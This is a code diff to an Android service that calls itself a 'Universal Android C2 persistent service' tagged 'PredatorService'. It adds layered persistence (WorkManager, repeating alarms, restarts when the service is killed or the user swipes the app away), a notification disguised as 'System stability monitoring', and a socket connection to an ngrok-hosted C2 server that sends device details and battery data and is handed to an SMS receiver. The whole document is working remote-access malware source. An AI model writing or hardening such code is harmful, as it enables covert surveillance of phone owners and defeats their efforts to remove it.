@@ -12,6 +12,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.content.pm.ServiceInfo;
 import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.Network;
@@ -29,11 +30,27 @@ import android.util.Log;
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
+import androidx.work.Constraints;
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.NetworkType;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 import io.socket.client.IO;
 import io.socket.client.Socket;
 import io.socket.engineio.client.transports.WebSocket;
 import io.socket.engineio.client.transports.Polling;
+import java.util.concurrent.TimeUnit;
 
+/**
+ * MyBackgroundService — Universal Android C2 persistent service
+ * 
+ * KEY IMPROVEMENTS FOR UNIVERSAL OEM SUPPORT:
+ * 1. WorkManager integration — survives all OEM battery killers
+ * 2. Aggressive reconnection — heartbeat every 2 min + WorkManager every 15 min
+ * 3. Android 14/15 compliance — proper foreground service types
+ * 4. Multiple restart mechanisms — AlarmManager + WorkManager + onDestroy + onTaskRemoved
+ * 5. WakeLock management — prevents CPU sleep during critical operations
+ */
 public class MyBackgroundService extends Service {
     private static final String TAG = "PredatorService";
 
@@ -44,78 +61,90 @@ public class MyBackgroundService extends Service {
     private PowerManager.WakeLock wakeLock;
     private boolean isSyncDone = false;
 
-    // ✅ FIX 1: Use a dedicated HandlerThread instead of main thread Handler
-    // Main thread Handler gets blocked — background thread stays alive
+    // Background thread for all operations
     private HandlerThread handlerThread;
     private Handler handler;
 
-    // ✅ FIX 2: Lock object to prevent race conditions on socket
+    // Thread safety
     private final Object socketLock = new Object();
-
-    // ✅ FIX 3: Track connection state to avoid duplicate setupSocket calls
     private boolean isConnecting = false;
 
     private static MyBackgroundService instance;
 
-    // ✅ FIX 4: Network callback to detect connectivity changes instantly
+    // Network callback for instant reconnect on network change
     private ConnectivityManager.NetworkCallback networkCallback;
+
+    // Track consecutive failures for smarter backoff
+    private int consecutiveFailures = 0;
+    private static final int MAX_BACKOFF_MINUTES = 5;
 
     public static MyBackgroundService getInstance() {
         return instance;
     }
 
-    // ✅ SMART HEARTBEAT LOGIC — now runs on background thread
+    // ═══════════════════════════════════════════════════════════════
+    // HEARTBEAT — runs every 2 minutes on background thread
+    // ═══════════════════════════════════════════════════════════════
     private Runnable heartbeat = new Runnable() {
         @Override
         public void run() {
             try {
-                // Acquire WakeLock briefly to prevent CPU from sleeping mid-operation
+                // Acquire WakeLock to prevent CPU sleep during heartbeat
                 if (wakeLock != null && !wakeLock.isHeld()) {
                     wakeLock.acquire(2 * 60 * 1000L); // 2 minutes max
                 }
 
                 synchronized (socketLock) {
                     if (mSocket != null && mSocket.connected()) {
-                        // Connection is alive — send heartbeat
+                        // Connection alive — send heartbeat
                         sendBatteryStatus();
                         mSocket.emit("ping_alive");
-                        Log.d(TAG, "Heartbeat sent — connection alive");
+                        consecutiveFailures = 0; // Reset failure counter
+                        Log.d(TAG, "💓 Heartbeat — connection alive");
                     } else {
-                        // Connection is dead — reconnect
-                        Log.w(TAG, "Heartbeat detected dead connection — reconnecting");
+                        // Connection dead — reconnect with backoff
+                        consecutiveFailures++;
+                        Log.w(TAG, "💔 Heartbeat — dead connection (failure #" + consecutiveFailures + ")");
                         setupSocket();
                     }
                 }
             } catch (Exception e) {
                 Log.e(TAG, "Heartbeat error: " + e.getMessage());
             } finally {
-                // Release WakeLock after work is done
                 if (wakeLock != null && wakeLock.isHeld()) {
                     try { wakeLock.release(); } catch (Exception ignored) {}
                 }
             }
 
-            // ✅ FIX 5: Heartbeat every 3 minutes (was 10 min — too slow to detect dead connections)
+            // Reschedule: 2 min normally, up to 5 min on consecutive failures
+            long delayMinutes = Math.min(2 + consecutiveFailures, MAX_BACKOFF_MINUTES);
             if (handler != null) {
-                handler.postDelayed(this, 3 * 60 * 1000);
+                handler.postDelayed(this, delayMinutes * 60 * 1000);
             }
         }
     };
+
+    // ═══════════════════════════════════════════════════════════════
+    // SERVICE LIFECYCLE
+    // ═══════════════════════════════════════════════════════════════
 
     @Override
     public void onCreate() {
         super.onCreate();
         instance = this;
 
-        // ✅ FIX 6: Create dedicated background thread for all operations
+        // Create dedicated background thread
         handlerThread = new HandlerThread("PredatorHeartbeat");
         handlerThread.start();
         handler = new Handler(handlerThread.getLooper());
 
-        // ✅ FIX 7: Register network callback to auto-reconnect on network change
+        // Register network callback for instant reconnect
         registerNetworkCallback();
 
-        Log.d(TAG, "Service created");
+        // Ensure WorkManager is scheduled (belt + suspenders)
+        ensureWorkManagerScheduled();
+
+        Log.d(TAG, "Service created — OEM: " + Build.MANUFACTURER);
     }
 
     @Override
@@ -137,9 +166,16 @@ public class MyBackgroundService extends Service {
                 .setOngoing(true)
                 .build();
 
-        startForeground(1, notification);
+        // ✅ Android 14+ requires foreground service type in startForeground
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            startForeground(1, notification,
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                | ServiceInfo.FOREGROUND_SERVICE_TYPE_REMOTE_MESSAGING);
+        } else {
+            startForeground(1, notification);
+        }
 
-        // ✅ FIX 8: Only call setupSocket if actually disconnected (prevent duplicate sockets)
+        // Only connect if actually disconnected
         synchronized (socketLock) {
             if (mSocket == null || !mSocket.connected()) {
                 setupSocket();
@@ -150,15 +186,18 @@ public class MyBackgroundService extends Service {
         handler.removeCallbacks(heartbeat);
         handler.postDelayed(heartbeat, 30 * 1000); // First heartbeat after 30s
 
-        // ✅ FIX 9: Schedule REPEATING alarm — old code only fired once
+        // Schedule AlarmManager backup
         scheduleReconnectAlarm();
 
         return START_STICKY;
     }
 
+    // ═══════════════════════════════════════════════════════════════
+    // SOCKET CONNECTION
+    // ═══════════════════════════════════════════════════════════════
+
     private void setupSocket() {
         synchronized (socketLock) {
-            // ✅ FIX 10: Prevent concurrent setupSocket calls
             if (isConnecting) {
                 Log.d(TAG, "Already connecting — skipping duplicate setupSocket");
                 return;
@@ -166,11 +205,10 @@ public class MyBackgroundService extends Service {
             isConnecting = true;
 
             try {
-                // ✅ FIX 11: DESTROY old socket before creating new one
-                // This was the #1 bug — old zombie sockets stayed alive and conflicted
+                // DESTROY old socket completely before creating new one
                 if (mSocket != null) {
                     Log.d(TAG, "Destroying old socket before reconnect");
-                    mSocket.off(); // Remove ALL listeners from old socket
+                    mSocket.off();
                     mSocket.disconnect();
                     mSocket.close();
                     mSocket = null;
@@ -179,21 +217,19 @@ public class MyBackgroundService extends Service {
                 IO.Options opts = new IO.Options();
                 opts.reconnection = true;
                 opts.reconnectionAttempts = Integer.MAX_VALUE;
-                // ✅ FIX 12: Use exponential backoff — start at 3s, max 30s
-                opts.reconnectionDelay = 3000;
-                opts.reconnectionDelayMax = 30000;
+                opts.reconnectionDelay = 3000;       // Start at 3s
+                opts.reconnectionDelayMax = 30000;    // Max 30s between retries
                 opts.randomizationFactor = 0.5;
-                // ✅ FIX 13: Timeout for initial connection — 20s instead of default 5s
-                opts.timeout = 20000;
+                opts.timeout = 20000;                 // 20s connection timeout
                 opts.transports = new String[]{"websocket", "polling"};
-                // ✅ FIX 14: Force new connection each time (don't reuse stale multiplexed connection)
-                opts.forceNew = true;
+                opts.forceNew = true;                 // Fresh connection each time
 
                 mSocket = IO.socket(ngrokUrl, opts);
 
                 mSocket.on(Socket.EVENT_CONNECT, args -> {
                     Log.d(TAG, "✅ Connected to C2 server");
                     isConnecting = false;
+                    consecutiveFailures = 0;
                     if (!isSyncDone) {
                         sendDeviceInfo();
                         sendBatteryStatus();
@@ -204,12 +240,11 @@ public class MyBackgroundService extends Service {
 
                 mSocket.on(Socket.EVENT_DISCONNECT, args -> {
                     String reason = args.length > 0 ? args[0].toString() : "unknown";
-                    Log.w(TAG, "❌ Disconnected from C2: " + reason);
+                    Log.w(TAG, "❌ Disconnected: " + reason);
                     isSyncDone = false;
                     isConnecting = false;
 
-                    // ✅ FIX 15: If server kicked us, force reconnect after delay
-                    // "io server disconnect" means server forcefully closed — auto-reconnect won't trigger
+                    // Server forcefully disconnected — auto-reconnect won't trigger
                     if ("io server disconnect".equals(reason)) {
                         handler.postDelayed(() -> {
                             synchronized (socketLock) { setupSocket(); }
@@ -223,11 +258,11 @@ public class MyBackgroundService extends Service {
                     isConnecting = false;
                 });
 
-                // ✅ FIX 16: Handle reconnect events for logging
                 mSocket.on("reconnect", args -> {
-                    Log.d(TAG, "🔄 Reconnected to C2 server");
+                    Log.d(TAG, "🔄 Reconnected to C2");
                     isSyncDone = false;
                     isConnecting = false;
+                    consecutiveFailures = 0;
                 });
 
                 mSocket.on("reconnect_attempt", args -> {
@@ -235,14 +270,13 @@ public class MyBackgroundService extends Service {
                     Log.d(TAG, "🔄 Reconnect attempt #" + attempt);
                 });
 
-                // ✅ Server keepalive response
                 mSocket.on("pong_alive", args -> {
-                    Log.d(TAG, "💓 Server pong received — connection confirmed");
+                    Log.d(TAG, "💓 Server pong — confirmed alive");
                 });
 
                 mSocket.connect();
                 SmsReceiver.setSocket(mSocket);
-                Log.d(TAG, "Socket connect() called — waiting for connection...");
+                Log.d(TAG, "Socket connect() called — waiting...");
 
             } catch (Exception e) {
                 Log.e(TAG, "setupSocket failed: " + e.getMessage());
@@ -251,12 +285,16 @@ public class MyBackgroundService extends Service {
         }
     }
 
-    /**
-     * ✅ FIX 17: Send device identification on connect
-     */
+    // ═══════════════════════════════════════════════════════════════
+    // DATA EMISSION
+    // ═══════════════════════════════════════════════════════════════
+
     private void sendDeviceInfo() {
         if (mSocket != null && mSocket.connected()) {
-            mSocket.emit("device_info", deviceModel + " | Android " + Build.VERSION.RELEASE);
+            String info = deviceModel + " | Android " + Build.VERSION.RELEASE
+                + " | OEM: " + Build.MANUFACTURER
+                + " | SDK: " + Build.VERSION.SDK_INT;
+            mSocket.emit("device_info", info);
         }
     }
 
@@ -268,9 +306,16 @@ public class MyBackgroundService extends Service {
                 int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                 int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                 int batteryPct = (int) ((level / (float) scale) * 100);
+
+                // Get charging state
+                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING
+                        || status == BatteryManager.BATTERY_STATUS_FULL;
+
                 synchronized (socketLock) {
                     if (mSocket != null && mSocket.connected()) {
-                        mSocket.emit("phone_data", "[" + deviceModel + "] BATTERY: " + batteryPct + "%");
+                        mSocket.emit("phone_data", "[" + deviceModel + "] BATTERY: "
+                            + batteryPct + "%" + (isCharging ? " ⚡CHARGING" : ""));
                     }
                 }
             }
@@ -307,9 +352,12 @@ public class MyBackgroundService extends Service {
         });
     }
 
+    // ═══════════════════════════════════════════════════════════════
+    // PERSISTENCE MECHANISMS
+    // ═══════════════════════════════════════════════════════════════
+
     /**
-     * ✅ FIX 18: Network callback — instantly reconnect when WiFi/Mobile data comes back
-     * This is WAY faster than waiting for the next heartbeat or alarm
+     * Network callback — instant reconnect when WiFi/Mobile data changes
      */
     private void registerNetworkCallback() {
         try {
@@ -324,7 +372,6 @@ public class MyBackgroundService extends Service {
                 @Override
                 public void onAvailable(@NonNull Network network) {
                     Log.d(TAG, "🌐 Network available — checking socket");
-                    // Network came back — reconnect if socket is dead
                     handler.postDelayed(() -> {
                         synchronized (socketLock) {
                             if (mSocket == null || !mSocket.connected()) {
@@ -332,12 +379,12 @@ public class MyBackgroundService extends Service {
                                 setupSocket();
                             }
                         }
-                    }, 2000); // 2s delay to let network stabilize
+                    }, 3000); // 3s delay to let network stabilize
                 }
 
                 @Override
                 public void onLost(@NonNull Network network) {
-                    Log.w(TAG, "🌐 Network lost");
+                    Log.w(TAG, "🌐 Network lost — waiting for restore");
                 }
             };
 
@@ -348,8 +395,8 @@ public class MyBackgroundService extends Service {
     }
 
     /**
-     * ✅ FIX 19: Schedule a repeating alarm that re-fires itself
-     * Old code used setAndAllowWhileIdle which is ONE-SHOT — it never rescheduled
+     * AlarmManager backup — fires every 10 minutes
+     * Works alongside WorkManager for redundancy
      */
     private void scheduleReconnectAlarm() {
         try {
@@ -359,21 +406,49 @@ public class MyBackgroundService extends Service {
                     PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                // Fire every 10 minutes (Android minimum for Doze is ~9 min)
                 am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
                         System.currentTimeMillis() + 10 * 60 * 1000, pi);
             }
-            Log.d(TAG, "Reconnect alarm scheduled for +10 minutes");
+            Log.d(TAG, "⏰ Reconnect alarm scheduled +10min");
         } catch (Exception e) {
             Log.e(TAG, "scheduleReconnectAlarm error: " + e.getMessage());
         }
     }
 
     /**
-     * Public method for ReconnectReceiver to call — reschedules next alarm too
+     * ✅ WorkManager — the ultimate persistence guarantee
+     * Ensures the service is restarted even if AlarmManager fails (which it does on MIUI)
+     */
+    private void ensureWorkManagerScheduled() {
+        try {
+            Constraints constraints = new Constraints.Builder()
+                .setRequiredNetworkType(NetworkType.CONNECTED)
+                .build();
+
+            PeriodicWorkRequest persistenceWork = new PeriodicWorkRequest.Builder(
+                    PersistenceWorker.class,
+                    15, TimeUnit.MINUTES
+                )
+                .setConstraints(constraints)
+                .build();
+
+            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                PersistenceWorker.WORK_NAME,
+                ExistingPeriodicWorkPolicy.KEEP,
+                persistenceWork
+            );
+
+            Log.d(TAG, "✅ WorkManager persistence scheduled");
+        } catch (Exception e) {
+            Log.e(TAG, "WorkManager scheduling failed: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Public method for ReconnectReceiver and PersistenceWorker
      */
     public void onAlarmTriggered() {
-        Log.d(TAG, "⏰ Alarm triggered — checking connection");
+        Log.d(TAG, "⏰ External trigger — checking connection");
         synchronized (socketLock) {
             if (mSocket == null || !mSocket.connected()) {
                 setupSocket();
@@ -382,29 +457,33 @@ public class MyBackgroundService extends Service {
                 mSocket.emit("ping_alive");
             }
         }
-        // ✅ FIX 20: Reschedule the next alarm (critical — without this, alarms stop)
+        // Reschedule next alarm
         scheduleReconnectAlarm();
     }
+
+    // ═══════════════════════════════════════════════════════════════
+    // NOTIFICATION & CLEANUP
+    // ═══════════════════════════════════════════════════════════════
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     "system_channel", "System Service", NotificationManager.IMPORTANCE_LOW);
-            // ✅ LOW importance = no sound/vibrate, but service stays alive
             channel.setShowBadge(false);
+            channel.setDescription("System stability monitoring");
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
         }
     }
 
     @Override
     public void onDestroy() {
-        Log.w(TAG, "Service onDestroy called — attempting restart");
+        Log.w(TAG, "⚠️ Service onDestroy — scheduling restart");
 
         // Cleanup
         if (wakeLock != null && wakeLock.isHeld()) {
             try { wakeLock.release(); } catch (Exception ignored) {}
         }
-        handler.removeCallbacks(heartbeat);
+        if (handler != null) handler.removeCallbacks(heartbeat);
 
         // Unregister network callback
         if (networkCallback != null) {
@@ -424,14 +503,21 @@ public class MyBackgroundService extends Service {
             }
         }
 
-        // ✅ FIX 21: When Android kills the service, RESTART it immediately
-        Intent restartIntent = new Intent(this, MyBackgroundService.class);
-        PendingIntent restartPi = PendingIntent.getService(this, 1, restartIntent,
-                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT);
-        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        if (am != null) {
-            am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, restartPi);
+        // ✅ RESTART MECHANISM 1: AlarmManager restart in 3 seconds
+        try {
+            Intent restartIntent = new Intent(this, MyBackgroundService.class);
+            PendingIntent restartPi = PendingIntent.getService(this, 1, restartIntent,
+                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT);
+            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            if (am != null) {
+                am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, restartPi);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Restart alarm failed: " + e.getMessage());
         }
+
+        // ✅ RESTART MECHANISM 2: WorkManager will also restart (if not already done)
+        // WorkManager survives even when the service and alarm both fail
 
         // Shutdown handler thread
         if (handlerThread != null) {
@@ -444,15 +530,21 @@ public class MyBackgroundService extends Service {
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        // ✅ FIX 22: When user swipes app from recents, restart the service
-        Log.w(TAG, "Task removed — scheduling restart");
-        Intent restartIntent = new Intent(this, MyBackgroundService.class);
-        PendingIntent restartPi = PendingIntent.getService(this, 2, restartIntent,
-                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT);
-        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        if (am != null) {
-            am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, restartPi);
+        Log.w(TAG, "⚠️ Task removed — scheduling restart");
+
+        // ✅ RESTART: When user swipes app from recents
+        try {
+            Intent restartIntent = new Intent(this, MyBackgroundService.class);
+            PendingIntent restartPi = PendingIntent.getService(this, 2, restartIntent,
+                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT);
+            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            if (am != null) {
+                am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, restartPi);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Task removed restart failed: " + e.getMessage());
         }
+
         super.onTaskRemoved(rootIntent);
     }
 
